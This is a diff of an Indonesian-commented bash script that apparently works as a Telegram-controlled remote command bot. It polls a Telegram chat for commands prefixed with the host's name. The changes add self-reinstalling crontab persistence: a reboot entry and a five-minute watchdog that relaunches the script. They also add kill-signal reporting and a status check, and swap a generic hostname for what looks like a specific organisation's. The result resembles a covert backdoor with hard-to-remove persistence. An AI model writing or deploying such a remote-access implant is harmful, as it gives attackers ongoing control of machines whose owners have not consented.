@@ -4,9 +4,9 @@
 cd "$(dirname "$0")" || exit
 
 # Konfigurasi
-BOT_TOKEN="0000000000000000000000000"
-CHAT_ID="-000000000000"
-HOSTNAME="gantibebas"  # Ubah sesuai kebutuhan
+BOT_TOKEN="000000000000000000000"
+CHAT_ID="-00000000000"
+HOSTNAME="marineciptaagung"  # Ubah sesuai kebutuhan
 PID_FILE="/tmp/bot_cmd.pid"
 SCRIPT_PATH="$(realpath "$0")"
 OFFSET_FILE="/tmp/bot_offset.txt"
@@ -26,15 +26,22 @@ if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
     exit 1
 fi
 
-# Tambahkan cronjob agar bot berjalan otomatis saat reboot
+# Tambahkan cronjob agar bot berjalan otomatis saat reboot & monitoring setiap 5 menit
 CRON_ENTRY="@reboot nohup bash $SCRIPT_PATH > /dev/null 2>&1 &"
+CHECK_CRON_ENTRY="*/5 * * * * pgrep -f '$SCRIPT_PATH' > /dev/null || nohup bash $SCRIPT_PATH > /dev/null 2>&1 &"
+
+# Perbarui crontab jika belum ada
 (crontab -l 2>/dev/null | grep -Fxq "$CRON_ENTRY") || (crontab -l 2>/dev/null; echo "$CRON_ENTRY") | crontab -
+(crontab -l 2>/dev/null | grep -Fxq "$CHECK_CRON_ENTRY") || (crontab -l 2>/dev/null; echo "$CHECK_CRON_ENTRY") | crontab -
 
 # Notifikasi saat bot pertama kali berjalan
 send_message "[$HOSTNAME] bot berhasil masuk kandang"
 
 # Simpan PID untuk pemantauan
 echo $$ > "$PID_FILE"
+
+# Trap untuk menangani ketika bot dihentikan (kill, CTRL+C, shutdown)
+trap 'send_message "[$HOSTNAME] bot meninggalkan kandang!!"; rm -f "$PID_FILE"; exit' SIGTERM SIGINT
 
 # Load offset terakhir
 if [[ -f "$OFFSET_FILE" ]]; then
@@ -57,6 +64,11 @@ while true; do
         OFFSET=$((UPDATE_ID + 1))
         echo "$OFFSET" > "$OFFSET_FILE"  # Simpan offset agar tidak membaca pesan lama
 
+        # Jika pesan adalah chkbot, kirim status bot
+        if [[ "$MESSAGE" == "chkbot" ]]; then
+            send_message "$HOSTNAME is On"
+        fi
+
         # Cek apakah pesan diawali dengan hostname kita
         if [[ "$MESSAGE" == "$HOSTNAME "* ]]; then
             CMD="${MESSAGE#"$HOSTNAME "}"  # Hapus hostname dari perintah
@@ -78,8 +90,6 @@ while true; do
     sleep 3
 done
 
-# Notifikasi jika bot mati
-send_message "[$HOSTNAME] bot keluar kandang / lepas"
-
-# Hapus PID file jika script berhenti
+# Jika script berhenti, kirim pesan dan hapus PID file
+send_message "[$HOSTNAME] bot meninggalkan kandang!!"
 rm -f "$PID_FILE"
